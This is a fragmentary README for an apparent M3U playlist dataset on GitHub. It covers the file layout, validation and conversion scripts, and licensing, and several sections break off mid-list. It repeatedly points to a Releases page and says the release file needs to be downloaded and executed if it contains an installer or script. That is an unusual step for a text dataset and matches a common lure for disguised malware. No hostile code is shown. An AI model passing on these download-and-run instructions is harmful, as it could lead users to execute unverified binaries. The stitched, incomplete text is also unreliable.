...
[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/releases)

![M3U code banner](https://images.unsplash.com/photo-1518770660439-4636190af475?ixlib=rb-1.2.1&auto=format&fit=crop&w=1950&q=80)
...
Badges
- License: GPL-3.0 — [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0.en.html)
...
- Release assets packaged as tar.gz or zip files for each dataset version.
...
- Visit the Releases page and pick the version you need:
  https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U/releases
- Download the release asset that matches your OS or workflow. The release page contains tar.gz or zip assets and a checksum file. The release file need to be downloaded and executed if it contains an installer or an execution script. For example:
  - Download the asset file from the Releases page.
  - Verify the checksum file next to the asset.
  - Extract the archive and run the included loader or installer script (for example: ./load_dataset.sh or python3 load_dataset.py).
...
3. Extract the package:
   ```bash
   tar -xzf ai2001-m3u-sc-v1.0.tar.gz
   ```
4. Run the loader:
   ```bash
   cd ai2001-m3u-sc
   python3 tools/load_m3u_dataset.py --input data --output processed
   ```
...
- meta/
  - files.json        # file-level metadata and per-file tags
  - licenses.json     # license mapping per source
- tools/
  - load_m3u_dataset.py
  - validate_m3u.py
  - convert_to_jsonl.py
- releases/
  - ai2001-m3u-sc-v1.0.tar.gz (example release asset)
  - ai2001-m3u-sc-v1.0-checksums.txt
...
Parser and tooling
- validate_m3u.py detects:
  - invalid header lines
  - mixed encoding
  - missing file path entries
  - malformed duration or tag syntax
- convert_to_jsonl.py converts each file to a JSONL line that contains:
...
- Token-level language modeling
  - Use convert_to_jsonl.py to convert the dataset to JSONL.
...
dataset = list(load_jsonl("processed/ai2001_m3u.jsonl"))
...
- Each file keeps its original license in meta/licenses.json.
- Use files according to their listed license. Attribution fields appear in files.json.

Contributing
- Fork the repo and open a pull request.
- Add new samples under data/raw/ and add metadata to meta/files.json.
- Run the validation script before opening a PR:
  ```bash
  python3 tools/validate_m3u.py data/raw/your_file.m3u8
  ```
...
- Cite the dataset in papers with a short reference block:
  ...
  - Version: v1.x
  - URL: https://github.com/natasLT/AI2001_Category-Source_Code-SC-M3U
...
License
- This repository uses GPL-3.0 for packaged releases. Check each file in meta/licenses.json for its original license.